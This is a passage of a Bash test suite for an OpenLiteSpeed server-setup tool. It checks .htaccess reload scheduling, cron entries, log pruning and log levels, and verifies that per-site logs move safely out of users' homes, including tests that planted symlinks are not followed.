lib_domain_state_reset
D_DOMAIN="wp.example.com"; D_IDENT="wp_example_com"; D_USER="wp_example_com"; D_GROUP="wp_example_com"
D_HOME="$SITES_ROOT/wp.example.com"; D_MODE="wordpress"; D_PHP="8.3"; D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
lib_domain_state_save
_ht_wp="$SITES_ROOT/wp.example.com/public_html"
lib_domain_state_reset
D_DOMAIN="plain.example.com"; D_IDENT="plain_example_com"; D_USER="plain_example_com"; D_GROUP="plain_example_com"
D_HOME="$SITES_ROOT/plain.example.com"; D_MODE="static"; D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
lib_domain_state_save
_ht_st="$SITES_ROOT/plain.example.com/public_html"
mkdir -p "$_ht_wp/wp-content/uploads" "$_ht_st"
_ht_roots="$(lib_ols_htaccess_docroots)"
assert_has   "a WordPress site's .htaccess is watched" "$_ht_wp" "$_ht_roots"
assert_lacks "a static site's is not (OpenLiteSpeed never reads it)" "$_ht_st" "$_ht_roots"

_orig_olsrun="$(declare -f lib_ols_running)"; _orig_htreload="$(declare -f lib_ols_htaccess_reload)"
eval 'lib_ols_running() { return "${_ht_running_rc:-0}"; }'
eval 'systemctl() { if [[ "$*" == *ActiveEnterTimestamp* ]]; then printf "%s\n" "$_ht_started"; fi; return 0; }'
# A file cannot be made to have arrived earlier (its change time is the kernel's), so the
# server's start is what moves. The modification time can be anything: unzip, tar, rsync -a
# and an SFTP client that keeps dates (WinSCP does by default) write the one from the source.
: >"$_ht_wp/.htaccess"; : >"$_ht_st/.htaccess"
_ht_started="@$(( $(date +%s) + 1 ))"
assert_eq "an .htaccess that was there when the server started is in effect" "" "$(lib_ols_htaccess_pending)"
_ht_started="@$(( $(date +%s) - 600 ))"
assert_eq "one written after the server started waits for a reload" "$_ht_wp/.htaccess" "$(lib_ols_htaccess_pending)"
rm -f "$_ht_wp/.htaccess"   # the check names the first one it finds
: >"$_ht_wp/wp-content/uploads/.htaccess"; touch -d '-3 days' "$_ht_wp/wp-content/uploads/.htaccess"
assert_eq "so does one unpacked or uploaded with its older date" "$_ht_wp/wp-content/uploads/.htaccess" "$(lib_ols_htaccess_pending)"
_ht_started=""
assert_eq "without a start time (not run by systemd) nothing is said" "" "$(lib_ols_htaccess_pending)"
_ht_started="@$(( $(date +%s) - 600 ))"; _ht_running_rc=1
assert_eq "a stopped server has nothing waiting" "" "$(lib_ols_htaccess_pending)"
_ht_running_rc=0

_ht_log="$TMP/ht.reloads"; : >"$_ht_log"
eval 'lib_ols_htaccess_reload() { printf "%s\n" "$1" >>"$_ht_log"; return 0; }'
eval 'flock() { return "${_ht_flock_rc:-0}"; }'
_ht_count() { wc -l <"$_ht_log" | tr -d ' '; }
( lib_ols_htaccess_check_main ) >/dev/null 2>&1
assert_eq  "the check reloads once for a waiting .htaccess" "1" "$(_ht_count)"
assert_has "and names it" "wp-content/uploads/.htaccess" "$(cat "$_ht_log")"
_ht_started="@$(( $(date +%s) - 30 ))"
( lib_ols_htaccess_check_main ) >/dev/null 2>&1
assert_eq  "but not within a minute of the last start" "1" "$(_ht_count)"
_ht_started="@$(( $(date +%s) - 600 ))"; _ht_flock_rc=1
( lib_ols_htaccess_check_main ) >/dev/null 2>&1
assert_eq  "nor while another command holds the lock" "1" "$(_ht_count)"
_ht_flock_rc=0; _ht_started="@$(( $(date +%s) + 1 ))"
( lib_ols_htaccess_check_main ) >/dev/null 2>&1
assert_eq  "and not at all when nothing changed since the last start" "1" "$(_ht_count)"
assert_eq  "the check exits 0 with errexit armed" 0 "$(run_isolated lib_ols_htaccess_check_main)"

assert_has "add --wordpress reloads once WordPress wrote its .htaccess" 'lib_ols_htaccess_reload' "$(declare -f lib_domain_add_main)"
assert_has "install schedules the check" 'lib_ols_htaccess_watch_ensure' "$(declare -f lib_install_cron_base)"
lib_ols_htaccess_watch_ensure
assert_has "the check runs every minute, as root" "* * * * * root ${BIN_LINK} htaccess-check --quiet # server-setup:htaccess" "$(cat "$CRON_FILE")"
assert_has "setup.sh: the check waits for no lock" 'htaccess-check) ;;' "$(cat "$ROOT/setup.sh")"
assert_has "setup.sh: it adds no header line to the log" '"$cmd" != "htaccess-check"' "$(cat "$ROOT/setup.sh")"
eval "$_orig_olsrun"; eval "$_orig_htreload"
unset -f systemctl flock _ht_count
rm -rf "$(lib_domain_state_dir wp.example.com)" "$(lib_domain_state_dir plain.example.com)"
lib_domain_state_reset
# From the command line WordPress cannot see that LiteSpeed takes rewrite rules: without its
# own configuration saying so, "wp rewrite --hard" wrote nothing into .htaccess
assert_has "wp-cli runs with its own configuration" 'WP_CLI_CONFIG_PATH=' "$(declare -f _wp)"
assert_has "which tells it rewrite rules work here" 'mod_rewrite' "$(declare -f lib_domain_wp_install)"
assert_has "and the install checks WordPress wrote them" 'BEGIN WordPress' "$(declare -f lib_domain_wp_install)"
# the check holds the lock for the seconds a reload takes: other commands wait for it
assert_has "a busy lock is waited for" 'flock -w' "$(declare -f lib_lock)"
if command -v flock >/dev/null 2>&1; then
  ( exec 9>"$LOCK_FILE"; flock 9; sleep 2 ) &
  _lk_pid=$!
  sleep 0.5
  assert_eq "a command waits for a lock that is released soon" 0 "$(SERVER_SETUP_LOCKED=0 LIB_LOCK_WAIT=10 run_isolated lib_lock)"
  wait "$_lk_pid" 2>/dev/null || true
  ( exec 9>"$LOCK_FILE"; flock 9; sleep 4 ) &
  _lk_pid=$!
  sleep 0.5
  assert_eq "and gives up after its limit" 1 "$(SERVER_SETUP_LOCKED=0 LIB_LOCK_WAIT=1 run_isolated lib_lock)"
  wait "$_lk_pid" 2>/dev/null || true
fi

# =============================================================================
section "OpenLiteSpeed's own logs: rolled files go after a while, live ones stay"
# OpenLiteSpeed deletes a rolled log only while it rolls the same log again, and never one of
# stderr.log's. The daily entry is a plain find, so it is run here for real, against files
# aged the way a server ages them.
assert_has "install schedules the cleanup" 'lib_ols_logs_prune_ensure' "$(declare -f lib_install_cron_base)"
lib_ols_logs_prune_ensure
_pl="$(grep '# server-setup:ols-logs$' "$CRON_FILE" || true)"
assert_has   "it runs daily, as root, over both log directories" "45 4 * * * root find -H ${LSWS_HOME}/logs ${LSWS_HOME}/admin/logs " "$_pl"
assert_has   "and keeps OLS_LOG_KEEP_DAYS days" "-mtime +${OLS_LOG_KEEP_DAYS} -delete" "$_pl"
assert_lacks "the line holds no %, which cron would turn into a line break" "%" "$_pl"
assert_has   "doctor notices a server without it" 'lib_cron_has ols-logs' "$(declare -f _doc_check_cron)"
_pl_home="$TMP/pl"; _pl_dir="$TMP/pl/logs"; _pl_adm="$TMP/pl/admin/logs"
_pl_age() { mkdir -p "$(dirname "$1")"; : >"$1"; touch -d "-$2 days" "$1"; }
_pl_old=$((OLS_LOG_KEEP_DAYS + 2)); _pl_new=$((OLS_LOG_KEEP_DAYS - 1))
_pl_live=(error.log access.log stderr.log _default.error.log lsrestart.log)
_pl_rolled=(error.log.2026_08_01 error.log.2026_08_01.01 access.log.2026_08_01.gz stderr.log.2026_08_01 _default.error.log.2026_08_01.02)
# the live logs of a quiet server are old as well: only the name may decide
for _f in "${_pl_live[@]}"; do _pl_age "${_pl_dir}/${_f}" 40; done
for _f in "${_pl_rolled[@]}"; do _pl_age "${_pl_dir}/${_f}" "$_pl_old"; done
_pl_age "${_pl_dir}/error.log.2026_09_20" "$_pl_new"
_pl_age "${_pl_dir}/notes.txt" 40
_pl_age "${_pl_dir}/error.log.2026_07_01/inner.log.2026_07_01" 40
touch -d '-40 days' "${_pl_dir}/error.log.2026_07_01"
_pl_age "${_pl_adm}/access.log" 40
_pl_age "${_pl_adm}/access.log.2026_08_01" "$_pl_old"
_pl_cmd="$(LSWS_HOME="$_pl_home" lib_ols_logs_prune_cmd)"
assert_eq "the cleanup exits 0" 0 "$(run_isolated bash -c "$_pl_cmd")"
for _f in "${_pl_live[@]}"; do assert_true "a live ${_f} stays, however old" test -e "${_pl_dir}/${_f}"; done
for _f in "${_pl_rolled[@]}"; do assert_false "an old ${_f} goes" test -e "${_pl_dir}/${_f}"; done
assert_true  "a rolled log younger than that stays" test -e "${_pl_dir}/error.log.2026_09_20"
assert_true  "a file OpenLiteSpeed did not roll stays" test -e "${_pl_dir}/notes.txt"
assert_true  "a directory with a rolled name stays, and what is in it" test -e "${_pl_dir}/error.log.2026_07_01/inner.log.2026_07_01"
assert_false "the WebAdmin's old rolled log goes" test -e "${_pl_adm}/access.log.2026_08_01"
assert_true  "and its live log stays" test -e "${_pl_adm}/access.log"
if (( CAN_SYMLINK )); then
  # a link with a rolled name is left alone, and so is the file it points at. The link itself
  # is aged too: a fresh one would stay for its age alone and prove nothing about -type f.
  _pl_age "$TMP/pl-victim" 40
  ln -s "$TMP/pl-victim" "${_pl_dir}/access.log.2026_07_02"
  touch -h -d '-40 days' "${_pl_dir}/access.log.2026_07_02"
  run_isolated bash -c "$_pl_cmd" >/dev/null
  assert_true "a link with a rolled name stays" test -L "${_pl_dir}/access.log.2026_07_02"
  assert_true "and so does the file it points at" test -e "$TMP/pl-victim"
  # a logs directory moved to another disk and linked back is still cleaned
  _pl_age "$TMP/pl-moved/error.log.2026_08_01" "$_pl_old"
  mkdir -p "$TMP/pl2/admin/logs"; ln -s "$TMP/pl-moved" "$TMP/pl2/logs"
  assert_eq    "a linked logs directory is cleaned as well" 0 "$(run_isolated bash -c "$(LSWS_HOME="$TMP/pl2" lib_ols_logs_prune_cmd)")"
  assert_false "its old rolled log is gone" test -e "$TMP/pl-moved/error.log.2026_08_01"
fi
unset -f _pl_age

# =============================================================================
section "the server log is written at NOTICE, not the package's DEBUG"
# The two log blocks are the package's own, byte for byte (dist/conf/httpd_config.conf.in).
# printf rather than a heredoc: an editor would strip the trailing blanks they carry.
_lv="$TMP/lv.conf"
printf '%s\n' \
  'user                             nobody' \
  'group                            nogroup' \
  '' \
  'errorlog logs/error.log {' \
  '        logLevel             DEBUG' \
  '        debugLevel           0' \
  '        rollingSize          10M' \
  '        enableStderrLog      1' \
  '}' \
  '    ' \
  'accessLog logs/access.log {' \
  '        rollingSize          10M    ' \
  '        keepDays             30    ' \
  '        compressArchive      0' \
  '        logReferer           1     ' \
  '        logUserAgent         1' \
  '}' \
  '    ' \
  'virtualhost inline {' \
  '  errorlog $VH_ROOT/logs/error.log {' \
  '    logLevel             DEBUG' \
  '  }' \
  '}' >"$_lv"
_lv_access="$(sed -n '/^accessLog/,/^}/p' "$_lv")"
OLS_TX_FILE="$_lv"
_ols_tx_server_log_level
assert_eq  "the server log goes to NOTICE"  "NOTICE" "$(lib_ols_tx_block_get errorlog logs/error.log logLevel)"
assert_eq  "its rolling size stays"          "10M"    "$(lib_ols_tx_block_get errorlog logs/error.log rollingSize)"
assert_eq  "and so does stderr.log"          "1"      "$(lib_ols_tx_block_get errorlog logs/error.log enableStderrLog)"
assert_eq  "the access log is not touched"   "$_lv_access" "$(sed -n '/^accessLog/,/^}/p' "$_lv")"
assert_has "nor a log nested in a virtual host" $'  errorlog $VH_ROOT/logs/error.log {\n    logLevel             DEBUG' "$(cat "$_lv")"
assert_eq  "the file still parses" 0 "$(run_isolated _ols_braces_balanced "$_lv")"
cp "$_lv" "$_lv.1"; _ols_tx_server_log_level
assert_true "a second run changes nothing" cmp -s "$_lv" "$_lv.1"
# once the WebAdmin saved it, the block is named after the full path
printf 'errorlog $SERVER_ROOT/logs/error.log {\n  logLevel                INFO\n  rollingSize             10M\n}\n' >"$_lv"
_ols_tx_server_log_level
assert_eq "a block the WebAdmin saved as well" "NOTICE" "$(lib_ols_tx_block_get errorlog '$SERVER_ROOT/logs/error.log' logLevel)"
printf 'user nobody\n' >"$_lv"; cp "$_lv" "$_lv.1"; _ols_tx_server_log_level
assert_true "without a server log block nothing is added" cmp -s "$_lv" "$_lv.1"
OLS_TX_FILE=""
assert_has "install and optimize apply it" '_ols_tx_server_log_level' "$(declare -f lib_ols_tx_apply_server_settings)"

# =============================================================================
section "update adds the scheduled tasks an older release did not write"
# self-update reconfigures nothing, so a server installed before the log cleanup existed gets
# it from update, which writes the same base tasks install does
assert_has "install writes the base tasks" 'lib_install_cron_base' "$(declare -f lib_install_cron)"
assert_has "and so does update"            'lib_install_migrate' "$(declare -f lib_update_main)"
assert_has "through what self-update runs too" 'lib_install_cron_base' "$(declare -f lib_install_migrate)"
cp "$CRON_FILE" "$TMP/cron.keep"
rm -f "$CRON_FILE"
lib_install_cron_base
assert_eq "a server with none gets all three" "healthcheck htaccess ols-logs" "$INS_CRON_ADDED"
assert_eq "and exactly the ones it names"     3 "$(grep -c '# server-setup:' "$CRON_FILE")"
# one from before the cleanup, with entries of its own after the base ones
lib_cron_set "wpcron:example.com" "*/5 * * * * example_com true"
lib_cron_set backup "0 3 * * * root ${BIN_LINK} backup --all --yes --quiet"
lib_cron_remove ols-logs
cp "$CRON_FILE" "$TMP/cron.before"
lib_install_cron_base
assert_eq  "an older server gets the one it lacks" "ols-logs" "$INS_CRON_ADDED"
assert_has "at the end" "# server-setup:ols-logs" "$(tail -n 1 "$CRON_FILE")"
assert_eq  "and every other line stays where it was" "$(cat "$TMP/cron.before")" "$(grep -v '# server-setup:ols-logs$' "$CRON_FILE")"
cp "$CRON_FILE" "$TMP/cron.after"
lib_install_cron_base
assert_eq   "a second run finds nothing missing" "" "$INS_CRON_ADDED"
assert_true "and leaves the file as it was" cmp -s "$CRON_FILE" "$TMP/cron.after"
lib_cron_remove ols-logs
cp "$CRON_FILE" "$TMP/cron.dry"
OPT_DRY_RUN=1; lib_install_cron_base >/dev/null; OPT_DRY_RUN=0
assert_eq   "a dry run names what it would add" "ols-logs" "$INS_CRON_ADDED"
assert_true "and writes nothing" cmp -s "$CRON_FILE" "$TMP/cron.dry"
cp "$TMP/cron.keep" "$CRON_FILE"

# =============================================================================
section "site logs: out of the site user's reach, and a link in the home"
# OpenLiteSpeed's main process opens a vhost's logs as root, creates them and hands them to
# nobody, whose workers write them. So they live in SITES_LOG_ROOT/<domain>, which only root may
# change, and /home/<domain>/logs - in a directory the site user owns - is only a link there.
lib_rollback_clear
lib_domain_state_reset
D_DOMAIN="logs.example.com"; D_IDENT="logs_example_com"; D_USER="logs_example_com"; D_GROUP="logs_example_com"
D_HOME="$SITES_ROOT/logs.example.com"; D_MODE="php"; D_PHP="8.3"; D_PHP_CHILDREN=4; D_MEMORY="256M"; D_UPLOAD="64M"
_ld="$SITES_LOG_ROOT/logs.example.com"
: >"$SETFACL_LOG"
assert_eq   "the directory setup exits 0" 0 "$(run_isolated lib_domain_dirs_create)"
assert_true "it makes the site's log directory" test -d "$_ld"
if (( CAN_CHMOD )); then
  assert_eq "0750, as logs/ was"                      750 "$(stat -c %a "$_ld")"
  assert_eq "under a root others may only pass through" 711 "$(stat -c %a "$SITES_LOG_ROOT")"
fi
assert_has   "OpenLiteSpeed's user may enter it, never through a link" "-P -m u:nobody:x ${_ld}" "$(cat "$SETFACL_LOG")"
assert_lacks "and nothing in the home is opened for it" "u:nobody:x ${D_HOME}/logs" "$(cat "$SETFACL_LOG")"
if (( CAN_SYMLINK )); then assert_eq "logs/ in the home leads there" "$_ld" "$(readlink "${D_HOME}/logs")"; fi
: >"$SETFACL_LOG"
OPT_DRY_RUN=1; _rc="$(run_isolated lib_domain_dirs_create)"; OPT_DRY_RUN=0
assert_eq "a dry run exits 0" 0 "$_rc"
assert_eq "and sets no ACL"   "" "$(cat "$SETFACL_LOG")"
# a dry run of a site that is not there yet makes nothing at all
_sv_dom="$D_DOMAIN"; _sv_home="$D_HOME"
D_DOMAIN="dry-logs.example.com"; D_HOME="$SITES_ROOT/dry-logs.example.com"
OPT_DRY_RUN=1; _rc="$(run_isolated lib_domain_dirs_create)"; OPT_DRY_RUN=0
assert_eq    "a dry run of a new site exits 0" 0 "$_rc"
assert_false "and makes no log directory" test -e "$SITES_LOG_ROOT/dry-logs.example.com"
assert_false "nor a home"                 test -e "$D_HOME"
# a failed add takes the log directory back with a home it made - but not from a home kept from
# before, where the directory may hold the only copy of an older release's history
lib_rollback_clear
lib_domain_dirs_create >/dev/null 2>&1
assert_has   "a new home: a failed run removes its log directory too" "rm -rf '$SITES_LOG_ROOT/dry-logs.example.com'" "${LIB_ROLLBACK_STACK[*]-}"
lib_rollback_clear; rm -rf "$SITES_LOG_ROOT/dry-logs.example.com"
lib_domain_dirs_create >/dev/null 2>&1
assert_true  "a kept home gets it made again"  test -d "$SITES_LOG_ROOT/dry-logs.example.com"
assert_lacks "but not taken back by a failure" "rm -rf '$SITES_LOG_ROOT/dry-logs.example.com'" "${LIB_ROLLBACK_STACK[*]-}"
lib_rollback_clear; rm -rf "$D_HOME" "$SITES_LOG_ROOT/dry-logs.example.com"
D_DOMAIN="$_sv_dom"; D_HOME="$_sv_home"
# whatever renders the vhost has its log directory in place first: renew-ssl, proxy, app too
rm -rf "$_ld"; : >"$SETFACL_LOG"
lib_ols_vhconf_write "$D_DOMAIN"
assert_true "writing the vhost makes its log directory" test -d "$_ld"
assert_has  "open to OpenLiteSpeed"                     "-P -m u:nobody:x ${_ld}" "$(cat "$SETFACL_LOG")"
if (( CAN_SYMLINK )); then rm -rf "${D_HOME}/logs"; ln -s "$_ld" "${D_HOME}/logs"; fi
: >"$RUNUSER_LOG"
lib_ols_logdir_open "$_ld" || true
assert_has "whether they can is asked of that user" "-u nobody -- test -x ${_ld}" "$(cat "$RUNUSER_LOG")"
_vh="$(lib_ols_render_vhconf)"
assert_has   "the vhost writes its error log there" "errorlog ${_ld}/error.log {" "$_vh"
assert_has   "and its access log"                   "accesslog ${_ld}/access.log {" "$_vh"
assert_lacks "and nothing into the site's home"     '$VH_ROOT/logs' "$_vh"
# PHP's warnings, fatal errors and error_log() lines arrive as "[NOTICE] ... [STDERR]"
_lvl() { awk '/^errorlog /,/^}/' | awk '$1 == "logLevel" { print $2 }'; }
assert_eq "so the site's error log is at NOTICE" "NOTICE" "$(lib_ols_render_vhconf | _lvl)"
assert_eq "the catch-all's stays at WARN"        "WARN"   "$(lib_ols_render_default_vhconf | _lvl)"
assert_has "the webmail's log directory is opened the same way" 'lib_ols_logdir_grant "$WM_LOG_DIR"' "$(declare -f lib_webmail_dirs_ensure)"
assert_lacks "lomp logs creates no log file as root" "touch" "$(declare -f lib_domain_logs_main)"
assert_has   "and follows the directory, not the link" 'lib_domain_log_dir_in_use "$domain"' "$(declare -f lib_domain_logs_main)"
assert_has   "remove deletes the logs with the files" 'lib_rm "$D_HOME" "$(lib_domain_log_dir "$domain")"' "$(declare -f lib_domain_remove_main)"

# a link the site user put in place of logs/ is replaced, and where it led is never read or
# written; a directory of the user's own is left alone
if (( CAN_SYMLINK )); then
  mkdir -p "$TMP/lv-victim"; printf 'keep\n' >"$TMP/lv-victim/error.log"
  rm -f "${D_HOME}/logs"; ln -s "$TMP/lv-victim" "${D_HOME}/logs"
  assert_eq "a link elsewhere: the setup exits 0" 0 "$(run_isolated lib_domain_dirs_create)"
  assert_eq "and logs/ leads to the log directory again" "$_ld" "$(readlink "${D_HOME}/logs")"
  assert_eq "where the other one led is as it was" "error.log" "$(ls -A "$TMP/lv-victim")"
  assert_eq "to the byte" "keep" "$(cat "$TMP/lv-victim/error.log")"
fi
rm -rf "${D_HOME}/logs"; mkdir -p "${D_HOME}/logs"; printf 'mine\n' >"${D_HOME}/logs/notes.txt"
_out="$(lib_domain_logs_link 2>&1)"
assert_true "a directory of the user's own is left alone" test -f "${D_HOME}/logs/notes.txt"
assert_has  "and named" "${D_HOME}/logs is not a link to ${_ld}" "$_out"
rm -rf "${D_HOME}/logs"

# An older release's logs/ - root's directory in the home. Once nothing writes there its
# history moves to the log directory, and it goes. The suite runs as whoever runs it, so the
# one question the move asks about the directory's owner is answered here.
eval 'stat() { if [[ "$*" == "-c %u ." && -n "${FAKE_OWNER_UID:-}" ]]; then printf "%s\n" "$FAKE_OWNER_UID"; else command stat "$@"; fi; }'
_old="${D_HOME}/logs"
_y1="$(date -d '-1 day' +%Y%m%d)"; _y2="$(date -d '-2 day' +%Y%m%d)"
_mk_old() {   # logs/ as a day of OpenLiteSpeed and logrotate leave it
  rm -rf "$_old"; mkdir -p "$_old"; chmod 0750 "$_old"
  printf 'A-live\n' >"$_old/access.log"; : >"$_old/error.log"
  printf 'A-rotated\n' >"$_old/access.log-20260101"
  printf 'E-rotated\n' | gzip -c >"$_old/error.log-20251231.gz"
}
if (( CAN_CHMOD )); then
  _mk_old
  rm -rf "$_ld"; mkdir -p "$_ld"; printf 'new\n' >"$_ld/access.log"
  printf 'taken\n' | gzip -c >"$_ld/access.log-${_y1}.gz"
  FAKE_OWNER_UID=0
  _out="$(lib_domain_logs_move_old 2>&1)"
  assert_false "the old directory goes"                 test -e "$_old"
  assert_eq    "a rotated copy keeps its name"          "A-rotated" "$(cat "$_ld/access.log-20260101")"
  assert_eq    "a compressed one too"                   "E-rotated" "$(gzip -dc "$_ld/error.log-20251231.gz")"
  # the newest copy is yesterday's, compressed: the old live log follows it as a gzip member,
  # so logrotate keeps it as long as that copy rather than deleting it first
  assert_eq    "the old live log goes at the end of the newest copy" "$(printf 'taken\nA-live')" "$(gzip -dc "$_ld/access.log-${_y1}.gz")"
  assert_false "and becomes no copy of its own"         test -e "$_ld/access.log-${_y2}.gz"
  assert_eq    "the log OpenLiteSpeed writes now is not touched" "new" "$(cat "$_ld/access.log")"
  assert_eq    "an empty one is dropped"                "error.log-20251231.gz" "$(ls "$_ld" | grep '^error\.log' | paste -sd' ' -)"
  assert_eq    "and nothing half-written stays"         "" "$(ls -A "$_ld" | grep 'lomp-tmp' || true)"
  assert_eq    "all of it quietly"                      "" "$_out"
  # a newest copy that is not compressed yet (delaycompress) gets the lines as they are
  rm -rf "$_old" "$_ld"; mkdir -p "$_old" "$_ld"; chmod 0750 "$_old"
  printf 'E-live\n' >"$_old/error.log"; printf 'E-older\n' >"$_old/error.log-20260103"; printf 'E-newest\n' >"$_old/error.log-20260104"
  lib_domain_logs_move_old >/dev/null 2>&1
  assert_eq    "a plain newest copy gets them appended" "$(printf 'E-newest\nE-live')" "$(cat "$_ld/error.log-20260104")"
  assert_eq    "and the older one is left as it was"    "E-older" "$(cat "$_ld/error.log-20260103")"
  # with no copy at all, the old live log becomes one, dated yesterday: logrotate never makes it
  rm -rf "$_old" "$_ld"; mkdir -p "$_old" "$_ld"; chmod 0750 "$_old"
  printf 'A-only\n' >"$_old/access.log"; : >"$_old/error.log"
  _d1="$(date -d '-1 day' +%Y%m%d)"
  lib_domain_logs_move_old >/dev/null 2>&1
  _d2="$(date -d '-1 day' +%Y%m%d)"   # the same day, unless the run crossed midnight
  assert_eq "with no copy it becomes one, dated yesterday" "A-only" \
    "$(gzip -dc "$_ld/access.log-${_d1}.gz" 2>/dev/null || gzip -dc "$_ld/access.log-${_d2}.gz" 2>/dev/null || true)"
  assert_eq "an empty one becomes nothing"   "" "$(ls "$_ld" | grep '^error\.log' || true)"
  assert_false "and is not left behind either" test -e "$_old"
  if (( CAN_CHMOD )); then assert_eq "readable by the site's group only" 640 "$(stat -c %a "$_ld/access.log-${_d1}.gz" 2>/dev/null || stat -c %a "$_ld/access.log-${_d2}.gz")"; fi
  # a name the log directory already has is never replaced: that file stays in the old logs/,
  # which then stays too, and the run says so
  rm -rf "$_old" "$_ld"; mkdir -p "$_old" "$_ld"; chmod 0750 "$_old"
  printf 'old\n' >"$_old/access.log-20260105"; printf 'there\n' >"$_ld/access.log-20260105"
  mkdir -p "$_old/sub"
  _out="$(lib_domain_logs_move_old 2>&1)"
  assert_eq   "a name already there is not replaced"   "there" "$(cat "$_ld/access.log-20260105")"
  assert_eq   "and the old file stays where it was"    "old" "$(cat "$_old/access.log-20260105")"
  assert_true "as does a directory in the old logs/"   test -d "$_old/sub"
  assert_has  "and the run says the rest stays there"  "could not all be moved" "$_out"
  assert_eq   "leaving nothing half-written"           "" "$(ls -A "$_ld" | grep 'lomp-tmp' || true)"
  # the directory entered is checked again from the inside, with the kernel's getcwd
  _mk_old; rm -rf "$_ld"; mkdir -p "$_ld"
  eval 'env() { if [[ "$*" == "pwd -P" && -n "${FAKE_PWD_IN_LOGS:-}" && "$PWD" == */logs ]]; then printf "%s\n" "$FAKE_PWD_IN_LOGS"; else command env "$@"; fi; }'
  FAKE_PWD_IN_LOGS="$TMP/elsewhere"
  _out="$(lib_domain_logs_move_old 2>&1)"
  unset FAKE_PWD_IN_LOGS; unset -f env
  assert_true "a directory that moved while it was entered is left alone" test -f "$_old/access.log"
  assert_has  "and named" "(it moved while it was entered)" "$_out"
  rm -rf "$_ld"; mkdir -p "$_ld"
  # ...and nothing that is not that directory
  _mk_old; FAKE_OWNER_UID=1000
  _out="$(lib_domain_logs_move_old 2>&1)"
  assert_eq  "one that is not root's is left as it is" "A-live" "$(cat "$_old/access.log")"
  assert_has "and named" "is not the log directory an older release made (it does not belong to root)" "$_out"
  _mk_old; FAKE_OWNER_UID=0; chmod 0770 "$_old"
  _out="$(lib_domain_logs_move_old 2>&1)"
  assert_true "nor one its group may write to" test -f "$_old/access.log"
  assert_has  "which is named as well" "others may write to it (mode 770)" "$_out"
  rm -rf "$_old"
  if (( CAN_SYMLINK )); then
    ln -s "$TMP/lv-victim" "$_old"
    assert_eq "a link in its place: nothing to move" 0 "$(run_isolated lib_domain_logs_move_old)"
    assert_eq "entered directly, the link is refused" 3 "$(run_isolated _domain_logs_move_old "$D_HOME" "$_ld" "$D_GROUP")"
    assert_eq "and nothing is read or moved from where it leads" "error.log" "$(ls -A "$TMP/lv-victim")"
    rm -f "$_old"
  fi
fi
unset FAKE_OWNER_UID
lib_domain_state_reset

# update moves the sites of an older release: lr1 keeps its logs in its home, lr2 is done
# already, lr3's logs/ is a link the site user planted (a file where the suite cannot make
# one), and lr4 has no logs/ at all
_orig_cb="$(declare -f lib_ols_change_begin)"; _orig_cc="$(declare -f lib_ols_change_commit)"
_orig_wi="$(declare -f lib_webmail_installed)"
_orig_wd="$(declare -f lib_webmail_dirs_ensure)"; _orig_rg="$(declare -f lib_domain_fail2ban_regen)"
_lr_calls="$TMP/lr-calls"
_lr1_old() { if [[ -d "$SITES_ROOT/lr1.example.com/logs" && ! -L "$SITES_ROOT/lr1.example.com/logs" ]]; then printf 'there'; else printf 'gone'; fi; }
# lib_ols_is_installed has no definition left here (an earlier section unset it), so this one
# is removed again below rather than restored
eval 'lib_ols_is_installed()    { return 0; }'
eval 'lib_ols_change_begin()    { OLS_PENDING_RELOAD=0; printf "begin\n" >>"$_lr_calls"; }'
# the old logs/ has to be there still when OpenLiteSpeed is reloaded: nothing moves before
eval 'lib_ols_change_commit()   { printf "commit %s pending=%s lr1-old=%s\n" "$1" "$OLS_PENDING_RELOAD" "$(_lr1_old)" >>"$_lr_calls"; OLS_PENDING_RELOAD=0; }'
eval 'lib_webmail_installed()   { return 1; }'
eval 'lib_webmail_dirs_ensure() { printf "webmail dirs\n" >>"$_lr_calls"; }'
eval 'lib_domain_fail2ban_regen() { printf "f2b lr1-old=%s\n" "$(_lr1_old)" >>"$_lr_calls"; }'
FAKE_OWNER_UID=0
_state_save="$STATE_DIR"; STATE_DIR="$TMP/lr-state"
for _d in lr1.example.com lr2.example.com lr3.example.com lr4.example.com; do
  _i="${_d//./_}"
  mkdir -p "$STATE_DIR/domains/$_d" "$SITES_ROOT/$_d/public_html"
  jq -n --arg d "$_d" --arg i "$_i" --arg h "$SITES_ROOT/$_d" \
    '{domain:$d, ident:$i, user:$i, group:$i, home:$h, mode:"php",
      php:{version:"8.3", children:4, memory_limit:"256M", upload_max:"64M"}}' >"$STATE_DIR/domains/$_d/domain.json"
done
_lr_old_vhconf() { printf 'errorlog $VH_ROOT/logs/error.log {\n  logLevel                WARN\n}\n'; }
mkdir -p "$SITES_ROOT/lr1.example.com/logs"; chmod 0750 "$SITES_ROOT/lr1.example.com/logs"
printf 'lr1-live\n' >"$SITES_ROOT/lr1.example.com/logs/access.log"
printf 'lr1-rotated\n' >"$SITES_ROOT/lr1.example.com/logs/access.log-20260102"
mkdir -p "$SITES_LOG_ROOT/lr2.example.com"
if (( CAN_SYMLINK )); then
  ln -s "$SITES_LOG_ROOT/lr2.example.com" "$SITES_ROOT/lr2.example.com/logs"
  mkdir -p "$TMP/lr-victim"; printf 'v\n' >"$TMP/lr-victim/access.log"
  ln -s "$TMP/lr-victim" "$SITES_ROOT/lr3.example.com/logs"
else
  : >"$SITES_ROOT/lr3.example.com/logs"
fi
for _d in lr1 lr3; do
  mkdir -p "$LSWS_VHOSTS_DIR/${_d}.example.com"; _lr_old_vhconf >"$LSWS_VHOSTS_DIR/${_d}.example.com/vhconf.conf"
done
# until update moves them, what reads the logs reads them where OpenLiteSpeed writes them
lib_domain_logrotate_regen
assert_has "until update, logrotate rotates lr1's logs where they are written" "${SITES_ROOT}/lr1.example.com/logs/*.log" "$(cat "$LOGROTATE_SITES_FILE")"
assert_has "and lr2's in its log directory"                                   "${SITES_LOG_ROOT}/lr2.example.com/*.log" "$(cat "$LOGROTATE_SITES_FILE")"
assert_eq  "lomp logs follows the same place" "${SITES_ROOT}/lr1.example.com/logs" "$(lib_domain_log_dir_in_use lr1.example.com)"
: >"$SETFACL_LOG"; : >"$_lr_calls"
lib_domain_logs_repair >"$TMP/lr-out" 2>&1
assert_eq "the sites that still logged into their homes are named" "lr1.example.com lr3.example.com" "$DOMAIN_LOGS_MOVED"
assert_eq "no vhost writes into a home any more" "" "$(grep -l '$VH_ROOT/logs' "$LSWS_VHOSTS_DIR"/lr?.example.com/vhconf.conf || true)"
assert_eq "every vhost is rendered again, its error log at NOTICE" "NOTICE NOTICE NOTICE NOTICE" \
